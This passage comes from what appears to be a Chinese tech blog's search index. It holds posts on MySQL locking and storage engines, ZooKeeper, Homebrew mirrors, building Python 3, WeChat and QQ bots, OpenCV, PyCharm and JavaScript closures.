locking)，它允许行级锁与表级锁共存，实际应用中，InnoDB使用的是意向锁。\n\n+ 首先，意向锁，是一个表级别的锁(table-level locking)；\n\n  \n\n+ 意向锁分为：\n\n  + **意向共享锁**(intention shared lock, IS)，它预示着，事务有意向对表中的某些行加共享S锁\n\n  + **意向排它锁**(intention exclusive lock, IX)，它预示着，事务有意向对表中的某些行加排它X锁\n\n  举个例子：\n\n  select … lock in share mode，要设置**IS锁**；\n\n  select … for update，要设置**IX锁**；\n\n  \n\n+ 意向锁协议(intention locking protocol)并不复杂：\n\n  + 事务要获得某些行的S锁，必须先获得表的IS锁\n\n  + 事务要获得某些行的X锁，必须先获得表的IX锁\n\n\n\n+ 由于意向锁仅仅表明意向，它其实是比较弱的锁，意向锁之间并不相互互斥，而是可以并行，其**兼容互斥表**如下：\n\n  |      | IS   | IX   |\n  | ---- | ---- | ---- |\n  | IS   | 兼容 | 兼容 |\n  | IX   | 兼容 | 兼容 |\n\n  \n\n+ 既然意向锁之间都相互兼容，那其意义在哪里呢？它会与共享锁/排它锁互斥，其**兼容互斥表**如下：\n\n  |      | S    | X    |\n  | ---- | ---- | ---- |\n  | IS   | 兼容 | 互斥 |\n  | IX   | 互斥 | 互斥 |\n\n\n\n+ 意向锁是有数据引擎自己维护的，用户无法手动操作意向锁，在为数据行加共享 / 排他锁之前，InooDB 会先获取该数据行所在在数据表的对应意向锁。\n\n  意向锁类似一个标志, 能提高加 表锁 的效率\n\n\n\n# 3. 参考资料\n\n+ [MySQL事务和锁机制详解](https://www.bilibili.com/video/BV1x54y1979n?from=search&seid=4833652458207423339)\n+ https://www.wencst.com/archives/1521\n\n","tags":["mysql"],"categories":["sql"]},{"title":"zookeeper介绍和使用","url":"%2Fp%2F7c519e18.html","content":"\n\n# 1. 分布式应用\n\n### 1.1 一致性\n\n强一致性\n\n弱一致性\n\n最终一致性\n\n<!-- more -->\n\n### 1.2 选举Leader\n\n先看 zid (写的一个日志 id),  再看 myid\n\n选取 Leader 时间节点\n\n+ 服务刚启动\n\n+ leader 挂了\n\n+ 超过一半的节点挂了， leader shutdown\n\n### 1.3 同步操作\n\nleader 负责写\n\nfollower 转发给 leader 写\n\n+ leader 生成日志，发给所有 follower\n\n+ follewer 持久化日志， 回复 ack\n\n+ leader 接收超过一半 ack, 发送commit,  更新 database\n\n+ follewer收到 commit, 更新 database\n\n\n\n# 2. zookeeper\n\n### 2.1 znode\n\n+ path 唯一路径\n\n+ data 数据, 可以没有\n\n+ childNode 子节点\n\n+ stat 状态属性\n\n+ type 节点类型\n\n  + 持久节点（除非手动删除，节点永远存在, 默认的）\n  + 持久有序节点（按照创建顺序会为每个节点末尾带上一个序号如：root-1）\n  + 临时节点（创建客户端与 Zookeeper 保持连接时节点存在，断开时则删除并会有相应的通知）\n    + 不能拥有子节点\n    + 服务注册\n    + 分布式锁\n  + 临时有序节点（在瞬时节点的基础上加上了顺序）\n\n  \n\n# 3. 安装和使用\n\n### 3.1 安装\n\n```bash\nbrew install zookeeper\n```\n\n安装完成，配置文件在 `/usr/local/etc/zookeeper/` \n\n### 3.2 使用\n\n```bash\nzkServer start #启动 zookeeper\nzkCli # 连接 zookeeper\n\nls /\ncreate /apps \"test\"\nget -s /apps\n\ncreate -s # 序号\ncreate -e # 临时\n```\n\n\n\n# 4. 分布式锁\n通过临时和序号的原理\n+ 创建临时序号节点\n+ 获取最小的节点是否时读锁, 如果是读, 那么获得锁\n+ 如果不是, 阻塞等待, 添加子节点变更监听(可以改进链表, 监听它的上一个节点)\n\n\n\n# 5. 服务注册和发现\n\n### 5.1 服务注册\n\n服务提供者（Provider）启动时，会向Zookeeper服务端注册服务信息，即会在Zookeeper服务器上创建一个服务节点(临时节点)，并在节点上存储服务的相关数据（如服务提供者的ip地址、端口等），比如注册一个用户注册服务（user/register）。\n\n### 5.2 服务发现\n\n服务消费者（Consumer）启动时，会根据本身依赖的服务信息，向Zookeeper服务端获取注册的服务信息并设置Watch，获取到注册的服务信息之后将服务提供者信息缓存在本地，调用服务时直接根据从Zookeeper注册中心获取到的服务注册信息调用服务，比如发现用户注册服务（user/register）并调用。\n\n### 5.3 服务通知\n\n当服务提供者因为某种原因宕机或不提供服务之后，Zookeeper服务注册中心的对应服务节点会被删除，因为消费者在获取服务信息的时候在对应节点上设置了Watch，因此节点删除之后会触发对应的Watcher，Zookeeper注册中心会异步向服务所关联的所有服务消费者发出节点删除的通知，服务消费者根据收到的通知更新缓存的服务列表。\n\n### 5.4 总结\n\n+ 注册使用临时节点, 保存 ip 和端口, 就算挂了节点也能释放\n+ 消费者监听父节点, 服务变换就会收到通知\n+ 根据列表中的一系列服务, 可以随机算法实现调用, 相当于负载均衡","tags":["zookeeper"],"categories":["中间件"]},{"title":"mac的homebrew使用","url":"%2Fp%2Fbe2ea1c8.html","content":"\nHomebrew是一款Mac OS平台下的软件包管理工具，拥有安装、卸载、更新、查看、搜索等很多实用的功能。简单的一条指令，就可以实现包管理，而不用你关心各种依赖和文件路径的情况，十分方便快捷。\n\n<!-- more -->\n\nHomebrew 会将软件包安装到独立目录，并将其文件软链接至 /usr/local 。\n\n```bash\ncd /usr/local\nfind Cellar\nCellar/wget/1.16.1\nCellar/wget/1.16.1/bin/wget\nCellar/wget/1.16.1/share/man/man1/wget.1\n\n$ ls -l bin\nbin/wget -> ../Cellar/wget/1.16.1/bin/wget\n```\n\n\n\n# 1. 安装使用\n\n去官网 https://brew.sh/ 看最新下载信息:\n\n```bash\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\"\n```\n\n常使用命令\n\n```bash\nbrew --version 或者 brew -v # 显示brew版本信息\n\nbrew list   #显示所有的已安装的软件\nbrew update #自动升级homebrew\nbrew upgrade  #升级所有已过时的软件，即列出的以过时软件\nbrew upgrade <formula> #升级指定的软件\n```\n\n\n\n# 2. 查看源更改源\n\n对于 homebrew，需要替换的是4个模块的镜像\n\n+ Homebrew（brew --repo）\n\n+ Homebrew Core（brew --repo homebrew/core）\n\n+ Homebrew Cask（brew --repo homebrew/cask）\n\n+ Homebrew-bottles\n\n替换: \n\n```bash\n#替换 Homebrew\ngit -C \"$(brew --repo)\" remote set-url origin https://mirrors.ustc.edu.cn/brew.git\n\n#替换 Homebrew Core\ngit -C \"$(brew --repo homebrew/core)\" remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git\n\n#替换 Homebrew Cask\ngit -C \"$(brew --repo homebrew/cask)\" remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git\n\n#替换 Homebrew-bottles\necho 'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles' >> ~/.zshrc\nsource ~/.zshrc\n\n# 更新\nbrew update\n```\n\n\n\n# 3. 参考资料\n\n+ https://brew.sh/\n+ https://www.zhihu.com/question/31360766/answer/749386652","tags":["mac"],"categories":["软件"]},{"title":"linux源码安装python3","url":"%2Fp%2F95e70f76.html","content":"\n\n\nlinux下大部分系统默认自带python2.x的版本. 默认的python被系统很多程序所依赖，比如centos下的yum就是python2写的，所以默认版本不要轻易删除，否则会有一些问题.\n\n如果需要使用最新的Python3那么我们可以编译安装源码包到独立目录，这和系统默认环境之间是没有任何影响的，python3和python2两个环境并存即可\n\n作为作死小能手, 不装最新版本怎么能行? 所以手动编译python3源码进行安装, 并记录遇到的一些问题.\n\n<!-- more -->\n\n\n\n### 1. 下载源码:\n\nhttps://www.python.org/downloads/source/\n\n找到最新的Source release 下载即可\n\n\n\n### 2. 安装准备工作:\n\n事实证明下面的这些软件不安装, 在编译python3时会出现各种问题, 所以先把这些软件都安装了.\n\n```shell\nyum install gcc  \n\nyum install zlib* # 注意此处带*, 因为需要 zlib-devel\n\nyum install libffi-devel # 不安装报错ModuleNotFoundError: No module named '_ctypes'\n\nyum install openss openssl-devel # 不安装会导致pip3缺少ssl, 无法下载包\n\n```\n\n\n\n### 3. 源码安装python3.7\n\n```shell\nwget https://www.python.org/ftp/python/3.7.3/Python-3.7.3.tgz  # 下载源码\n\ntar -zxvf Python-3.7.3.tgz\n\ncd Python-3.7.3\n\n./configure --with-ssl --with-ensurepip=install # --with-ensurepip=install是安装pip3 --with-ssl是让pip3支持ssl\n\nmake \n\nmake altinstall # 注意此处是altinstall, 如果是install, 会和python2造成冲突\n```\n\n\n\n### 4. 建立python软链接\n\n安装成功后, 执行程序为python3.7, 我们为了方便使用需要建立一个软链接\n\n```shell\nwhich python3.7\n/usr/local/bin/python3.7\n\n\nln -s /usr/local/bin/python3.7 /usr/local/bin/python3\nln -s /usr/local/bin/pip3.7 /usr/local/bin/pip3\n```\n\n","tags":["linux"],"categories":["python"]},{"title":"微信机器人itchat的使用","url":"%2Fp%2F4f93001b.html","content":"\n\n\n近期准备用微信机器人实现往微信群里发消息. 需要用到微信机器人.\n\n目前的微信机器人大部分都是基于web微信协议, 因此仅能覆盖 Web 微信本身所具备的功能。例如收发消息, 加好友, 转发消息, 自动回复, 陪人聊天,消息防撤回等等.\n\n但是web微信目前不支持抢红包和朋友圈等相关功能, 并且使用机器人存在一定概率被限制登录的可能性, 主要表现为无法登陆 Web 微信 (但不影响手机等其他平台)。\n\n<!-- more -->\n\n\n\n### 1. 安装使用\n\n+ 可参考: https://github.com/littlecodersh/ItChat\n\n```shell\npip3 install itchat\n```\n\n\n\n+ 登录微信并且向文件助手发送一条消息\n\n```python\nimport itchat\n\nitchat.auto_login()\n\nitchat.send('Hello, filehelper', toUserName='filehelper')\n```\n\n\n\n+ 更多例子可以参考官方文档 https://itchat.readthedocs.io/zh/latest/\n\n\n\n### 2. 发送消息到微信群\n\n发送消息到微信群, 首先要保证微信群保存在通讯录, 如果不保存到通讯录，是无法在各设备之间同步的（所以itchat也无法读取到）\n\n```python\n# coding=utf8\nimport itchat\n\n\ndef send_group(group, msg):\n    rooms = itchat.get_chatrooms(update=True)\n    rooms = itchat.search_chatrooms(name=group)\n    if not rooms:\n        print(\"None group found\")\n    else:\n        itchat.send(msg, toUserName=rooms[0][\"UserName\"])\n\n\nif __name__ == \"__main__\":\n    itchat.auto_login(hotReload=True)\n    send_group(u\"你的群聊名字\", \"test msg\")\n    itchat.run()\n\n```\n\n\n\n\n\n### 3. 机器人AI聊天\n\n```python\n# coding=utf8\nimport itchat\nimport requests\n\nKEY = 'xxxxxxxx' #可以去http://www.turingapi.com/申请\n\n\ndef get_response(msg):\n    apiUrl = 'http://www.tuling123.com/openapi/api'\n    data = {\n        'key': KEY,\n        'info': msg,\n        'userid': 'wechat-robot',\n    }\n    try:\n        r = requests.post(apiUrl, data=data).json()\n        return r.get('text')\n    except:\n        return\n\n\n@itchat.msg_register(itchat.content.TEXT)\ndef tuling_reply(msg):\n    defaultReply = 'I received: ' + msg['Text']\n    reply = get_response(msg['Text'])\n    return reply or defaultReply\n\n\nitchat.auto_login(hotReload=True)\nitchat.run()\n```\n\n\n\n### 4. 消息防撤回\n\n可参考下面的这个项目\n\nhttps://github.com/ccding/wechat-anti-revoke \n\n\n\n### 5. 其他微信机器人项目\n\n+ https://github.com/youfou/wxpy   在 itchat 的基础上，通过大量接口优化提升了模块的易用性，并进行丰富的功能扩展\n+ https://github.com/lb2281075105/Python-WeChat-ItChat 使用itchat的一些demo\n+ https://github.com/littlecodersh/itchatmp 微信公众号、企业号接口项目\n+ https://github.com/newflydd/itchat4go golang版本封装的itchat\n\n\n\n","tags":["wechat"],"categories":["爬虫"]},{"title":"QQ机器人酷Q的使用","url":"%2Fp%2F545a4e78.html","content":"\n\n\n近期准备用qq机器人实现往qq群里发消息. 需要用到qq机器人.\n\n据说在2019年前, 用qq机器人是非常之方便. 但是自从Smart QQ 协议在 2019 年 1 月 1 日停止服务后, 网上好多qq机器人项目都失效了.\n\n目前找到了一款酷Q机器人 https://cqp.cc/, 使用并且测试成功.  最重要的一点是酷Q的Air版还是免费的.\n\n\n\n<!-- more -->\n\n### 1. 下载使用\n\n酷Q官方下载的是windows版本(https://cqp.cc/t/23253) , 需要在windows上运行并登录QQ. 这个虽然简单方便, 但是需要一直在windows上挂着, 很显然这个条件不太具备.\n\n目的是在linux上挂机运行酷Q, 所以找到了酷Q的`docker`版本.\n\n\n\n### 2. 安装酷Q docker版本\n\n+ 安装docker(已安装docker直接看下一步)\n\n```shell\nyum install yum-utils device-mapper-persistent-data lvm2\nyum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo\nyum install docker-ce\n\n\nsystemctl start docker\nsystemctl enable docker\n```\n\n\n\n+ 安装酷Q官方 docker 版本  https://cqp.cc/t/34558 (建议安装下面的CoolQ插件版本)\n\n```shell\ndocker pull coolq/wine-coolq\nmkdir /root/coolq-data # 用于存储酷 Q 的程序文件\n\ndocker run --name=coolq --d \\\n-p 9001:9000 \\ # noVNC 端口，用于从浏览器控制酷 Q\n-v /root/coolq-data:/home/user/coolq \\ # 将宿主目录挂载到容器内用于持久化酷 Q 的程序文件\n-e VNC_PASSWD=12345678 \\ # 设置noVNC登录密码, 默认密码是 MAX8char\n-e COOLQ_ACCOUNT=123456 \\ # 要登录的 QQ 账号，可选\ncoolq/wine-coolq\n```\n\n此时在浏览器中访问 http://你的服务器IP:你的端口 即可看到远程操作登录页面，输入密码，即可看到 酷Q Air 的登录界面啦。\n\n\n\n+ 安装CoolQ插件的 docker 版本 https://github.com/richardchien/coolq-http-api\n\nCoolQ插件通过 HTTP 或 WebSocket 对酷 Q 的事件进行上报以及接收请求来调用酷 Q 的 DLL 接口，从而可以使用其它语言编写酷 Q 插件。\n\n  \n\n```shell\ndocker pull richardchien/cqhttp:latest\nmkdir coolq  # 用于存储酷 Q 的程序文件\n\ndocker run -ti -d --name cqhttp-test \\\n-v $(pwd)/coolq:/home/user/coolq \\  # 将宿主目录挂载到容器内用于持久化酷 Q 的程序文件\n-p 9001:9000 \\ # noVNC 端口，用于从浏览器控制酷 Q\n-p 5700:5700 \\ # HTTP API 插件开放的端口\n-e VNC_PASSWD=12345678 \\ # 设置noVNC登录密码, 默认密码是 MAX8char\n-e COOLQ_ACCOUNT=123456 \\ # 要登录的 QQ 账号，可选\n-e CQHTTP_SERVE_DATA_FILES=yes \\ # 允许通过 HTTP 接口访问酷 Q 数据文件\nrichardchien/cqhttp:latest\n```\n\n\n\n### 3. 发送消息到qq群\n\n其实QQ机器人不仅能发送消息到qq群, 还能发送消息到个人, 转发群消息, 加好友, 踢人等一系列操作\n\n详见api列表:  https://richardchien.gitee.io/coolq-http-api/docs/4.8/#/API\n\n\n\n+ 调用方式也很简单, 参见api文档\n\n```\nPOST  http://ip:5700/send_group_msg\n\ngroup_id: qq群号\nmessage: 发送的消息\n```\n\n\n\n### 4. 酷Q机器人AI聊天\n\n机器人还有个用处就是可以实现AI自动聊天.\n\n目前酷Q支持 图灵机器人(http://www.turingapi.com/)和小i机器人(http://cloud.xiaoi.com/)\n\n安装酷Q后,添加对应的程序即可","tags":["robot"],"categories":["爬虫"]},{"title":"opencv在python下的安装和使用","url":"%2Fp%2F415d206d.html","content":"\n\n\n### 安装opencv\n\n\n```shell\npip3 install numpy\npip3 install opencv-python\n```\n\n在安装`opencv-python`出现了以下错误信息:\n\n```\n Could not fetch URL https://pypi.org/simple/opencv-python/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/opencv-python/ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:726)'),)) - skipping\n```\n\n解决方案: \n\n```shell\npip3 install --trusted-host pypi.org --trusted-host files.pythonhosted.org opencv-python\n```\n\n\n\n<!-- more -->\n\n### opencv rotate code\n\n```python\nimport sys\nimport cv2\nimport numpy as np\n\n\nif len(sys.argv) != 2 :\n    print(\"usage: ./images path\")\n    sys.exit(1)\n\nimg = cv2.imread(sys.argv[1])\ncv2.imshow(\"Source\", img)\n\nimg90 = np.rot90(img) # 旋转90\ncv2.imshow(\"Rotate\", img90)\n\ncv2.waitKey(0)\ncv2.destroyAllWindows()\n```\n","tags":["python"],"categories":["python"]},{"title":"opencv在mac源码安装并运行cpp版","url":"%2Fp%2F9c99a6b7.html","content":"\n\n\n### 1. mac 安装 cmake\n\n+ 下载安装 CMake。\n\n  https://cmake.org/download/   Mac OS X 10.7 or later\n\n+ 安装完成之后，使用以下指令创建/usr/local/bin下 CMake 的软链接。\n\n```shell\nsudo \"/Applications/CMake.app/Contents/bin/cmake-gui\" --install\n```\n\n\n\n### 2. 源码安装 opencv\n\n目前opencv已经出到4.0+版本了, 网上大部分教程都是2.0,3.0版本的.\n\n不过我们选择最新的版本, 直接从github上拉取\n\n```shell\ngit clone https://github.com/opencv/opencv.git\nmkdir build\ncd build\ncmake ..\nmake \nsudo make install\n```\n\n<!-- more -->\n\n### 3. xcode 配置opencv\n\n如果不想用xcode来开发, 编译的时候直接指定下面的选项\n\n+ Header Search Paths\n\n```\n/usr/local/include/opencv4  (不一定是这个, 要看你的make install 安装到哪个目录了)\n```\n\n+ Library Search Paths\n\n```\n/usr/local/lib (不一定是这个, 要看你的make install 安装到哪个目录了)\n```\n\n+ Other Linker Flags\n\n```\n-lopencv_calib3d -lopencv_core -lopencv_dnn -lopencv_features2d -lopencv_flann -lopencv_gapi -lopencv_highgui -lopencv_imgcodecs -lopencv_imgproc -lopencv_ml -lopencv_objdetect -lopencv_photo -lopencv_stitching -lopencv_video -lopencv_videoio \n```\n\n不一定是这些, 要去`/usr/local/lib` 文件夹(`make install`安装目录)下看 opencv开头的库\n\n\n\n\n### 4. opencv rotate code\n\n```cpp\n#include <stdio.h>\n#include <opencv2/opencv.hpp>\n\nusing namespace cv;\n\nint main(int argc, char* argv[])\n{\n    if (argc != 3)\n    {\n        printf(\"usage: ./images path angle\\n\");\n        return -1;\n    }\n    \n    Mat source = imread(argv[1], 1);\n    if (!source.data)\n    {\n        printf(\"No image data \\n\");\n        return -1;\n    }\n    \n    double angle = atof(argv[2]);\n    Point2f src_center(source.cols/2.0F, source.rows/2.0F);\n    Mat rot_mat = getRotationMatrix2D(src_center, angle, 1.0);\n    Mat dst;\n    warpAffine(source, dst, rot_mat, source.size());\n    \n\n    imshow(\"Source\", source);\n    imshow(\"Rotate\", dst);\n    waitKey(0);\n    \n    return 0;\n}\n```\n\n","tags":["opencv"],"categories":["c++"]},{"title":"python最好用IDE之pycharm的使用","url":"%2Fp%2Fb3d62374.html","content":"\n\n\n工欲善其事必先利其器, 学习 python 自然选用了 jetbrains 家族的 Pycharm.\n\n### 1. pycharm formatting on save\n\n1. PyCharm -> Preferences -> Plugins -> Save Actions -> install and restart ide\n2. PyCharm -> Preferences -> Save Actions -> Reformat file\n\n![1](python最好用IDE之pycharm的使用/1.png)\n\n<!-- more -->\n\n3. 取消Power Save Mode\n\n   IDE右下角有个机器人, 一定不要勾选 Power Save Mode\n\n   具体表现：关闭后，Pycharm就跟文本编辑器差不多了，不会去关联上下文，像纠错、联想关键字等功能都没有了\n\n\n\n### 2. Keymap\n\n进入发现了, ctrl+w 和 ctrl+a 和 ctrl+e 失效, 很别扭, 研究发现了, 需要在 Keymap 选择  `Mac OS X 10.5+`\n\nctrl + w 关闭\n\nctrl + a 到行首\n\nctrl + e 到行尾\n\n\n\n### 3. Alt + Enter 万能组合键\n\nimport 包经常要用到这个组合键, 但是发现在我的电脑上又失效\n\n网上找了很多方法也没有解决. 一说是其他程序占用, 可以关闭所有程序试试\n\n最后找到了解决方案, 就是把`Save Actions`  插件停掉, 重启之后再开启, 就好了(吐血)\n\n\n\n### 4. module unresolved reference\n\n- 在项目的文件夹(module 的上一级)右键 `Mark Directory as` -> `Source root`\n- `File` -> `Invalidate Caches / Restart` and restart PyCharm.","tags":["python"],"categories":["python"]},{"title":"Mysql中MyISAM和InnoDB区别","url":"%2Fp%2Ff9fde0e9.html","content":"\n\n\n# 1. MySQL存储引擎\n\n### 1.1 默认存储引擎的变迁\n\n在MySQL 5.1之前的版本中，默认的搜索引擎是MyISAM，从MySQL 5.5之后的版本中，默认的搜索引擎变更为InnoDB。\n\nInnoDB 支持事务，MyISAM 不支持事务。这是 MySQL 将默认存储引擎从 MyISAM 变成 InnoDB 的重要原因之一。\n\nInnoDB 最小的锁粒度是行锁，MyISAM 最小的锁粒度是表锁。一个更新语句会锁住整张表，导致其他查询和更新都会被阻塞，因此并发访问受限。这也是 MySQL 将默认存储引擎从 MyISAM 变成 InnoDB 的重要原因之一。\n\n<!-- more -->\n\n### 1.2 MyISAM\n\nMyISAM存储引擎的特点是：表级锁、**不支持事务**和 全文索引，适合一些CMS内容管理系统作为后台数据库使用，但是使用大并发、重负荷生产系统上，表锁结构的特性就显得力不从心；\n\nMyISAM适合：\n\n（1）做很多count 的计算；\n\n（2）插入不频繁，查询非常频繁，如果执行大量的SELECT，MyISAM是更好的选择；\n\n（3）没有事务。\n\n### 1.3 InnoDB\n\nInnoDB存储引擎的特点是：行级锁、事务安全（ACID兼容）、支持外键、不支持FULLTEXT类型的索引(5.6.4以后版本开始支持FULLTEXT类型的索引)。\n\nInnoDB存储引擎提供了具有提交、回滚和崩溃恢复能力的事务安全存储引擎。InnoDB是为处理巨大量时拥有最大性能而设计的。它的CPU效率可能是任何其他基于磁盘的关系数据库引擎所不能匹敌的。\n\nInnoDB适合：\n\n（1）可靠性要求比较高，或者要求事务；\n\n（2）表更新和查询都相当的频繁，并且表锁定的机会比较大的情况指定数据引擎的创建；\n\n（3）如果你的数据执行大量的INSERT或UPDATE，出于性能方面的考虑，应该使用InnoDB表；\n\n（4）DELETE FROM table时，InnoDB不会重新建立表，而是一行一行的 删除；\n\n（5）LOAD TABLE FROM MASTER操作对InnoDB是不起作用的，解决方法是首先把InnoDB表改成MyISAM表，导入数据后再改成InnoDB表，但是对于使用的额外的InnoDB特性（例如外键）的表不适用。\n\n\n\n要注意，创建每个表格的代码是相同的，除了最后的 TYPE参数，这一参数用来指定数据引擎。\n\n\n\n# 2. 具体区别\n\n+ 存储结构\n\nMyISAM：每个MyISAM在磁盘上存储成三个文件。分别为：表定义文件、数据文件、索引文件。第一个文件的名字以表的名字开始，扩展名指出文件类型。.frm文件存储表定义。数据文件的扩展名为.MYD (MYData)。索引文件的扩展名是.MYI (MYIndex)。\n\nInnoDB：所有的表都保存在同一个数据文件中（也可能是多个文件，或者是独立的表空间文件），InnoDB表的大小只受限于操作系统文件的大小，一般为2GB。\n\n\n\n+ 索引\n\nMyISAM: 是非聚集索引，数据文件是分离的，索引保存的是数据文件的指针。主键索引和辅助索引是独立的。\n\nInnoDB: 是聚集索引。聚簇索引的文件存放在主键索引的叶子节点上，因此 InnoDB 必须要有主键，通过主键索引效率很高。但是辅助索引需要两次查询，先查询到主键，然后再通过主键查询到数据。因此，主键不应该过大，因为主键太大，其他索引也都会很大。\n\n\n\n+ 存储空间\n\nMyISAM： MyISAM支持支持三种不同的存储格式：静态表(默认，但是注意数据末尾不能有空格，会被去掉)、动态表、压缩表。当表在创建之后并导入数据之后，不会再进行修改操作，可以使用压缩表，极大的减少磁盘的空间占用。\n\nInnoDB： 需要更多的内存和存储，它会在主内存中建立其专用的缓冲池用于高速缓冲数据和索引。\n\n\n\n+ 可移植性、备份及恢复\n\nMyISAM：数据是以文件的形式存储，所以在跨平台的数据转移中会很方便。在备份和恢复时可单独针对某个表进行操作。\n\nInnoDB：免费的方案可以是拷贝数据文件、备份 binlog，或者用 mysqldump，在数据量达到几十G的时候就相对痛苦了。\n\n\n\n+ 事务支持\n\nMyISAM：强调的是性能，每次查询具有原子性,其执行数度比InnoDB类型更快，但是不提供事务支持。\n\nInnoDB：提供事务支持事务，外部键等高级数据库功能。 具有事务(commit)、回滚(rollback)和崩溃修复能力(crash recovery capabilities)的事务安全(transaction-safe (ACID compliant))型表。\n\n\n\n+ AUTO_INCREMENT \n\nMyISAM：可以和其他字段一起建立联合索引。引擎的自动增长列必须是索引，如果是组合索引，自动增长可以不是第一列，他可以根据前面几列进行排序后递增。\n\nInnoDB：InnoDB中必须包含只有该字段的索引。引擎的自动增长列必须是索引，如果是组合索引也必须是组合索引的第一列。\n\n\n\n+ 表锁差异\n\nMyISAM： 只支持表级锁，用户在操作myisam表时，select，update，delete，insert语句都会给表自动加锁，如果加锁以后的表满足insert并发的情况下，可以在表的尾部插入新的数据。\n\nInnoDB： 支持事务和行级锁，是innodb的最大特色。行锁大幅度提高了多用户并发操作的新能。但是InnoDB的行锁，只是在WHERE的主键是有效的，非主键的WHERE都会锁全表的。\n\n\n\n+ 全文索引\n\nMyISAM：支持 FULLTEXT类型的全文索引\n\nInnoDB：不支持FULLTEXT类型的全文索引，但是innodb可以使用sphinx插件支持全文索引，并且效果更好。\n\n\n\n+ 表主键\n\nMyISAM：允许没有任何索引和主键的表存在，索引都是保存行的地址。\n\nInnoDB：如果没有设定主键或者非空唯一索引，就会自动生成一个6字节的主键(用户不可见)，数据是主索引的一部分，附加索引保存的是主索引的值。\n\n\n\n+ 表的具体行数\n\nMyISAM： 保存有表的总行数，如果select count(*) from table;会直接取出出该值。*\n\nInnoDB： 没有保存表的总行数，如果使用select count(*) from table；就会遍历整个表，消耗相当大，但是在加了wehre条件后，myisam和innodb处理的方式都一样。\n\n\n\n+ CRUD操作\n\nMyISAM：如果执行大量的SELECT，MyISAM是更好的选择。\n\nInnoDB：如果你的数据执行大量的INSERT或UPDATE，出于性能方面的考虑，应该使用InnoDB表。\n\n\n\n+ 外键\n\nMyISAM：不支持\n\nInnoDB：支持\n\n\n\n# 3. 参考资料\n\n+ [MySQL存储引擎－－MyISAM与InnoDB区别](https://link.zhihu.com/?target=https%3A//segmentfault.com/a/1190000008227211)\n\n","tags":["mysql"],"categories":["sql"]},{"title":"javascript作用域,上下文环境,自由变量以及闭包","url":"%2Fp%2F1e35a583.html","content":"\n\n\n### javascript 的作用域\n\n+ 在 javascript 中, 没有块级的作用域 (反人类),  所以为了避免误解, 最好不要在块作用域内声明变量\n\n```javascript\nvar i = 10;\nif i > 1 {\n    var name = \"levon\";\n}\nconsole.log(name);//levon\n```\n\n+ 除了全局作用域, 只有函数才可以创建作用域\n+ 作用域有上下级关系, 最大的目的就是隔离变量, 不同作用域下同名变量也不会冲突\n\n```javascript\nvar a = 10; //window.a = 10; 全局作用域\n\nfunction fn(){\n    var a = 100; //fn 作用域\n    \n    function bar(){\n        var a = 1000; //bar 作用域\n    }\n}\n```\n\n<!-- more -->\n\n### javascript 的作用域和执行上下文环境\n\n- 作用域只是一个“地盘”，一个抽象的概念。\n- 如果要查找一个作用域下某个变量的值，就需要找到这个作用域对应的执行上下文环境，再在其中寻找变量的值。\n- 作用域中变量的值是在执行过程中产生的确定的，而作用域却是在函数创建时就确定了。\n- 同一个作用域下，不同的调用会产生不同的执行上下文环境，继而产生不同的变量的值。\n\n\n\n### 作用域和上下文环境绝对不是一回事儿\n\n+ 作用域:\n\n首先，它很抽象。另外除了全局作用域，只有函数才能创建作用域。创建一个函数就创建了一个作用域，无论你调用不调用，函数只要创建了，它就有独立的作用域，就有自己的一个“地盘”。\n\n+ 上下文环境:\n\n可以理解为一个看不见摸不着的对象（有若干个属性），虽然看不见摸不着，但确实实实在在存在的，因为所有的变量都在里面存储着，要不然咱们定义的变量在哪里存？\n\n另外，对于函数来说，上下文环境是在调用时创建的，这个很好理解。拿参数做例子，你不调用函数，我哪儿知道你要给我传什么参数？\n\n+ 两者之间的关系:\n\n一个作用域下可能包含若干个上下文环境。有可能从来没有过上下文环境（函数从来就没有被调用过）；有可能有过，现在函数被调用完毕后，上下文环境被销毁了；有可能同时存在一个或多个（闭包）。\n\n```javascript\nvar x = 100;\nfunction fn(x){\n    return function(){\n        console.log(x);\n    }\n}\n\nvar f1 = fn(5);\nvar f2 = fn(10);\n\nf1();//5\nf2();//10\n```\n\n上面代码一个fn作用域下同时存在两个上下文环境。可以理解作用域是静态的组织结构，而上下文环境是动态的调用。\n\n\n\n### 自由变量依赖静态作用域\n\n- 在 A作用域中使用的变量 x, 却没有在 A作用域中声明(即在其他作用域中声明的), 那么对于 A作用域来说, x 就是一个自由变量.\n\n```javascript\nvar x = 10;\nfunction fn(){\n    var b = 20;\n    console.log(x + b); //这里的 x 就是一个自由变量\n}\n```\n\n- 那么去哪里取自由变量的值?  要到 创建 包含自由变量 函数 的那个 作用域 中取值——是“创建”，而不是“调用”. 一定要切记其实这就是所谓的“静态作用域”。\n\n- 那么在执行 fn 的时候, x 取值去哪里取呢?  答案是要到创建fn函数的那个作用域中取——>无论fn函数将在哪里调用。(anywhere call, only find on create)\n\n- 如果静态作用域找不到怎么办? 此时就需要一级一级跨作用域一直找到全局作用域\n\n```javascript\nvar a = 10;\n\nfunction fn(){\n    var b = 20; // 如果此处没有20, b 就会找到200\n    \n    function bar(){\n        console.log(a + b);// a 一直跨到全局作用域找到, b 直接在 fn 作用域找到,  \n    }\n    \n    return bar;\n}\n\nvar x = fn();\nvar b = 200;\nx();\n```\n\n\n\n来看一道题:\n\n```javascript\nvar x = 10;\n\nfunction show(){\n\n\tfunction fn(){\n\t\tconsole.log(x);\n\t}\n\n    var x = 20;\n\n\t(function(){\n\t\tvar x = 30;\n\t\tfn();\n\t})();\n}\n\nshow();//答案是20, 想想为什么\n```\n\n\n\n### 闭包其实就是上下文环境不销毁\n\n闭包一般只有两种情况——函数作为返回值，函数作为参数传递。\n\n```javascript\nfunction fn(){\n    var max = 10;\n    \n    return function bar(x){\n        if (x > max){\n            console.log(x);\n        }\n    };\n}\n\nvar f1 = fn();\nvar max = 100;\nf1(15);\n```\n\n\n\n+ 全局上下文环境准备,   global —>  f1 = undefined, max = undefined\n+ 执行到 var f1 = fn();  进入fn()执行上下文环境.    fn —> max = 10\n+ fn() 函数返回, 